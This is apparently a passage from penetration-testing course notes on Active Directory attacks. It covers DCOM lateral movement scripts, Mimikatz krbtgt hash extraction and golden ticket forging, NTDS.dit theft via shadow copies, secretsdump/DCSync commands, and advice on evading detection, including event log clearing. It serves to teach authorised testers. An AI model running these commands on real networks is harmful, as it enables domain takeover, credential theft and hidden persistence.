Distributed Component Object Model (DCOM) provides object-oriented remote procedure call capabilities that can be abused for lateral movement. DCOM offers stealthier alternatives to traditional remote execution methods.

### DCOM Architecture

**Component Structure:**
- **DCOM Objects:** Distributed objects accessible over network
- **RPC Communication:** Uses RPC for remote method invocation
- **Authentication:** Supports NTLM and Kerberos authentication
- **Port Usage:** TCP 135 (endpoint mapper) + dynamic high ports

**Common DCOM Objects:**
- **MMC20.Application:** Microsoft Management Console automation
- **Excel.Application:** Microsoft Excel automation object
- **Outlook.Application:** Microsoft Outlook automation object
- **ShellWindows:** Windows Shell automation interface

### MMC20.Application DCOM Lateral Movement

**Basic DCOM Execution:**
```powershell
# Create DCOM object on remote system
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

# Execute command via DCOM
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc.exe","7")

# Alternative command execution
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-nop -w hidden -e <base64_payload>","7")
```

**DCOM with Credentials:**
```powershell
# Create credential object
$username = 'Administrator'
$password = 'password123'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# DCOM execution with explicit credentials
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"), $credential)
```

### Excel.Application DCOM Lateral Movement

**Excel DCOM Object:**
```powershell
# Create Excel DCOM object
$excel = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","192.168.50.73"))

# Execute macro or command
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd", "/c calc.exe")

# Cleanup
$excel.Quit()
```

### ShellWindows DCOM Lateral Movement

**Shell Automation:**
```powershell
# Create ShellWindows DCOM object
$shell = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application","192.168.50.73"))

# Navigate and execute
$item = $shell.Windows().Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","","")
```

### DCOM Enumeration and Discovery

**Available DCOM Objects:**
```powershell
# Enumerate DCOM applications
Get-CimInstance -ClassName Win32_DCOMApplication | Select-Object Name, AppID

# Query specific DCOM object
Get-CimInstance -ClassName Win32_DCOMApplication -Filter "Name='MMC20.Application.1'"

# Remote DCOM enumeration
Get-CimInstance -ComputerName "192.168.50.73" -ClassName Win32_DCOMApplication
```

**DCOM Configuration Analysis:**
```powershell
# Check DCOM permissions
$dcomApp = Get-CimInstance -ClassName Win32_DCOMApplication -Filter "Name='MMC20.Application.1'"
$dcomApp | Get-CimAssociatedInstance -Association Win32_DCOMApplicationSetting
```

### DCOM Detection and Evasion

**Detection Indicators:**
- **RPC Traffic:** Unusual RPC endpoint connections
- **Process Creation:** Unexpected child processes from DCOM objects
- **Event Logs:** DCOM activation events (Event ID 10016)
- **Network Patterns:** DCOM-specific network signatures

**Evasion Techniques:**
- **Object Selection:** Use less commonly monitored DCOM objects
- **Timing Variation:** Implement delays between operations
- **Process Injection:** Inject into existing DCOM processes
- **Custom Objects:** Develop custom DCOM objects for specific operations

### Advanced DCOM Techniques

**PowerShell DCOM Framework:**
```powershell
function Invoke-DCOMLatMovement {
    param(
        [string]$ComputerName,
        [string]$Command,
        [string]$DCOMObject = "MMC20.Application.1",
        [System.Management.Automation.PSCredential]$Credential
    )
    
    try {
        if ($Credential) {
            $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID($DCOMObject, $ComputerName), $Credential)
        } else {
            $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID($DCOMObject, $ComputerName))
        }
        
        switch ($DCOMObject) {
            "MMC20.Application.1" {
                $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c $Command", "7")
            }
            "Excel.Application" {
                $dcom.DisplayAlerts = $false
                $dcom.DDEInitiate("cmd", "/c $Command")
                $dcom.Quit()
            }
        }
        
        Write-Output "Command executed successfully on $ComputerName"
    }
    catch {
        Write-Error "DCOM execution failed: $($_.Exception.Message)"
    }
}
```

DCOM lateral movement provides stealthy alternatives to traditional remote execution methods, leveraging legitimate Windows functionality while avoiding common detection signatures associated with tools like PsExec and WMI.

---

# Active Directory Persistence

Once adversaries obtain access to single or multiple hosts, they seek to maintain access as long as possible. This means attacker access must persist through system reboots and credential changes. MITRE defines persistence as a tactic consisting of techniques aimed at maintaining an attacker's foothold on the target network.

Active Directory environments offer both traditional persistence methods and AD-specific persistence techniques that leverage domain infrastructure for long-term access maintenance.

**Important Note:** In many real-world penetration tests or red-team engagements, persistence is not part of the scope due to the risk of incomplete removal once the assessment is complete.

## Table of Contents

### 2. [Active Directory Persistence](#active-directory-persistence)
- **2.1 [Golden Ticket Persistence](#golden-ticket-persistence)**
- **2.2 [Shadow Copies for Credential Extraction](#shadow-copies-for-credential-extraction)**

---

## Golden Ticket Persistence

Golden Tickets represent one of the most powerful persistence techniques in Active Directory environments. By obtaining the krbtgt account password hash, attackers can create self-made custom TGTs that provide unlimited domain access.

### Golden Ticket Fundamentals

**Kerberos TGT Encryption:**
- **KDC Secret Key:** TGTs encrypted with secret key known only to KDCs
- **krbtgt Account:** Domain user account whose password hash serves as the secret key
- **Ticket Forgery:** Possession of krbtgt hash enables custom TGT creation
- **Domain Trust:** Domain controllers trust correctly encrypted TGTs

**Golden Ticket vs Silver Ticket:**
- **Silver Tickets:** Forge TGS tickets for specific service access
- **Golden Tickets:** Provide unlimited access to entire domain resources
- **Scope Difference:** Service-specific vs domain-wide access
- **Power Level:** Golden tickets offer superior attack capabilities

### Golden Ticket Prerequisites and Advantages

**Attack Requirements:**
- **Domain Admin Access:** Requires Domain Admin group membership or DC compromise
- **krbtgt Hash Extraction:** Must obtain krbtgt account NTLM hash
- **Domain SID:** Requires domain Security Identifier for ticket creation

**Persistence Advantages:**
- **Password Stability:** krbtgt password not automatically changed
- **Longevity:** Hash remains valid for extended periods
- **Domain Functional Level:** Only changes during pre-2008 to newer upgrades
- **Legacy Environments:** Very old krbtgt hashes commonly found

### Demonstrating Golden Ticket Attack

**Initial Access Verification (Expected Failure):**
```cmd
# Attempt lateral movement without proper permissions
C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access DC1:
Access is denied.
```

**krbtgt Hash Extraction (Domain Controller Access Required):**
```mimikatz
# Enable debug privileges
privilege::debug

# Extract krbtgt password hash using LSA dump
lsadump::lsa /patch
```

**Sample Hash Extraction Output:**
```
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```

**Key Information Extracted:**
- **Domain SID:** S-1-5-21-1987370270-658905905-1781884369
- **krbtgt NTLM Hash:** 1693c6cefafffc7af11ef34d1c788f47
- **Administrator Hash:** Available for additional attacks

### Golden Ticket Creation and Injection

**Ticket Preparation:**
```mimikatz
# Clear existing Kerberos tickets
kerberos::purge
```

**Golden Ticket Generation:**
```mimikatz
# Create golden ticket with existing user account (post-July 2022 requirement)
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

**Golden Ticket Creation Output:**
```
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session
```

**Default Golden Ticket Values:**
- **User ID:** 500 (built-in administrator RID)
- **Groups ID:** Most privileged AD groups (513, 512, 520, 518, 519)
- **Domain Admins:** Group 512 included by default
- **Enterprise Admins:** Group 519 for forest-wide access

### Golden Ticket Verification and Usage

**Launch Command Prompt with Golden Ticket:**
```mimikatz
# Launch new command prompt with injected golden ticket
misc::cmd
```

**Successful Domain Controller Access:**
```cmd
# PsExec with golden ticket (using hostname for Kerberos)
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Windows\system32>ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::5cd4:aacd:705a:3289%14
   IPv4 Address. . . . . . . . . . . : 192.168.50.70
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

C:\Windows\system32>whoami
corp\jen
```

**Group Membership Verification:**
```cmd
C:\Windows\system32>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes    
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
CORP\Group Policy Creator Owners            Group            S-1-5-21-1987370270-658905905-1781884369-520 Mandatory group, Enabled by default, Enabled group
CORP\Schema Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-518 Mandatory group, Enabled by default, Enabled group
CORP\Enterprise Admins                      Group            S-1-5-21-1987370270-658905905-1781884369-519 Mandatory group, Enabled by default, Enabled group
CORP\Denied RODC Password Replication Group Alias            S-1-5-21-1987370270-658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288                                                                        
```

**Privileged Group Memberships Confirmed:**
- **Domain Admins (512):** Full domain administrative access
- **Schema Admins (518):** Schema modification privileges
- **Enterprise Admins (519):** Forest-wide administrative access
- **Group Policy Creator Owners (520):** Group Policy management rights

### Authentication Protocol Considerations

**Kerberos vs NTLM Authentication:**
```cmd
# Golden ticket works with Kerberos (hostname)
psexec.exe \\DC1 cmd.exe  # SUCCESS

# NTLM authentication still blocked (IP address)
psexec.exe \\192.168.50.70 cmd.exe  # FAILURE
```

**Protocol Selection Logic:**
- **Hostname Usage:** Forces Kerberos authentication (golden ticket works)
- **IP Address Usage:** Forces NTLM authentication (golden ticket ineffective)
- **Overpass-the-Hash:** Golden ticket technique represents overpass-the-hash attack
- **Authentication Bypass:** Leverages forged Kerberos tickets instead of NTLM hashes

### Golden Ticket Operational Security

**Stealth Considerations:**
- **Existing Account Requirement:** Post-July 2022 Microsoft update requires valid account names
- **Account Selection:** Use low-privilege account names to avoid suspicion
- **Ticket Lifetime:** Default 10-year lifetime may be excessive and suspicious
- **Group Membership:** Default high-privilege groups may trigger alerts

**Detection Avoidance:**
- **Custom Lifetimes:** Set realistic ticket expiration times
- **Selective Groups:** Include only necessary group memberships
- **Account Legitimacy:** Use accounts that normally have required access
- **Usage Patterns:** Avoid suspicious authentication patterns

---

## Shadow Copies for Credential Extraction

Shadow Copies (Volume Shadow Service - VSS) provide a Microsoft backup technology for creating snapshots of files or entire volumes. Domain administrators can abuse VSS to extract the Active Directory database (NTDS.dit) for offline credential extraction.

### Shadow Copy Technology Overview

**Volume Shadow Service (VSS):**
- **Backup Technology:** Microsoft's snapshot-based backup solution
- **File-Level Snapshots:** Individual file or entire volume snapshots
- **Point-in-Time Recovery:** Restore files to previous states
- **Administrative Tool:** vshadow.exe from Windows SDK

**NTDS.dit Database:**
- **Active Directory Database:** Contains all domain user credentials
- **Hash Storage:** NTLM hashes and Kerberos keys for all accounts
- **Offline Analysis:** Extracted database enables offline credential attacks
- **SYSTEM Hive Requirement:** Registry hive needed for proper decryption

### Shadow Copy Creation Process

**vshadow.exe Execution:**
```cmd
# Create shadow copy with optimized settings
C:\Tools>vshadow.exe -nw -p C:
```

**Command Parameters:**
- **-nw:** Disable writers (speeds up backup creation)
- **-p:** Store copy on disk (persistent shadow copy)
- **C:** Target volume for shadow copy creation

**Shadow Copy Creation Output:**
```
VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.

(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000010
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:

* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 9/19/2022 4:31:51 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  Auto_Release No_Writers Differential

Snapshot creation done.
```

**Critical Information:**
- **Shadow Copy Device Name:** \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
- **Snapshot ID:** Unique identifier for the shadow copy
- **Creation Time:** Timestamp for forensic analysis
- **Provider ID:** VSS provider information

### NTDS.dit Database Extraction

**Copy NTDS.dit from Shadow Copy:**
```cmd
# Extract AD database from shadow copy
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
   1 file(s) copied.
```

**Extract SYSTEM Registry Hive:**
```cmd
# Save SYSTEM hive for decryption keys
C:\>reg.exe save hklm\system c:\system.bak
The operation completed successfully.
```

**Required Files for Offline Analysis:**
- **ntds.dit.bak:** Active Directory database containing credentials
- **system.bak:** SYSTEM registry hive containing decryption keys
- **File Transfer:** Both files must be transferred to analysis system

### Offline Credential Extraction

**Impacket secretsdump Analysis:**
```bash
# Extract credentials using Impacket secretsdump
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

**Credential Extraction Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
```

**Kerberos Keys Extraction:**
```
[*] Kerberos keys from ntds.dit.bak
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
DC1$:des-cbc-md5:f7f804ce43264a43
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
```

### Extracted Credential Analysis

**User Account Credentials:**
- **Administrator:** Domain administrator account
- **krbtgt:** Key Distribution Center service account
- **Service Accounts:** iis_service and other service accounts
- **User Accounts:** dave, stephanie, jeff, jeffadmin, pete, jen
- **Computer Accounts:** DC1$, WEB04$, FILES04$, CLIENT74$, etc.

**Credential Utilization Options:**
- **Password Cracking:** Attempt to crack NTLM hashes for plaintext passwords
- **Pass-the-Hash:** Use hashes directly for authentication
- **Golden Tickets:** Use krbtgt hash for persistent domain access
- **Silver Tickets:** Use service account hashes for specific service access

### Alternative Persistence Methods

**DCSync Alternative:**
```bash
# Remote credential extraction using DCSync
impacket-secretsdump -just-dc corp.com/jeffadmin:"password"@192.168.50.70
```

**DCSync Advantages:**
- **Remote Execution:** No need for direct domain controller access
- **Stealth Factor:** Uses legitimate AD replication protocols
- **Tool Independence:** No need to upload additional tools
- **Network-Based:** Operates over standard AD communication channels

### Shadow Copy vs DCSync Comparison

| Feature | Shadow Copy | DCSync |
|---------|-------------|---------|
| **Access Required** | Local DC Admin | Domain Admin Rights |
| **Tool Upload** | vshadow.exe required | No tools needed |
| **Detection Risk** | File system activity | Network replication traffic |
| **Stealth Level** | Moderate | High |
| **Credential Scope** | All domain credentials | Selective credential extraction |
| **Forensic Artifacts** | Shadow copy files | Minimal artifacts |

### Operational Security Considerations

**Shadow Copy Artifacts:**
- **VSS Events:** Windows Event Log entries for shadow copy creation
- **File System Changes:** Temporary shadow copy device creation
- **Registry Modifications:** VSS-related registry entries
- **Process Activity:** vshadow.exe execution traces

**Stealth Recommendations:**
- **DCSync Preference:** Use DCSync when possible for reduced artifacts
- **Cleanup Procedures:** Remove shadow copies and extracted files
- **Timing Considerations:** Perform during maintenance windows
- **Log Management:** Consider event log clearing (with caution)

---

## Wrapping Up

This module concludes Active Directory concepts by providing comprehensive coverage of lateral movement and persistence techniques. The effectiveness of these techniques depends on the security posture of the target environment, though AD security improvements over the years have enhanced defensive capabilities.

### Key Takeaways

**Lateral Movement Mastery:**
- **Multiple Techniques:** WMI, WinRM, PsExec, Pass-the-Hash, Overpass-the-Hash, DCOM
- **Tool Diversity:** Understanding various tools and their appropriate use cases
- **Protocol Knowledge:** NTLM vs Kerberos authentication implications
- **Stealth Considerations:** Balancing effectiveness with detection avoidance

**Persistence Strategies:**
- **Golden Tickets:** Ultimate domain persistence through krbtgt hash abuse
- **Shadow Copies:** Comprehensive credential extraction for offline analysis
- **Long-term Access:** Maintaining access through system changes and reboots
- **Risk Management:** Understanding engagement scope and cleanup requirements

**Security Implications:**
- **Attack Surface:** AD complexity creates multiple attack vectors
- **Legacy Dependencies:** Interoperability with legacy systems reduces security
- **Detection Challenges:** Legitimate tools and protocols used maliciously
- **Defense Evolution:** Ongoing improvements in AD security architecture

Mastering Active Directory enumeration, authentication, and lateral movement techniques represents a crucial step toward becoming an experienced penetration tester, providing the foundation for understanding complex enterprise security environments.
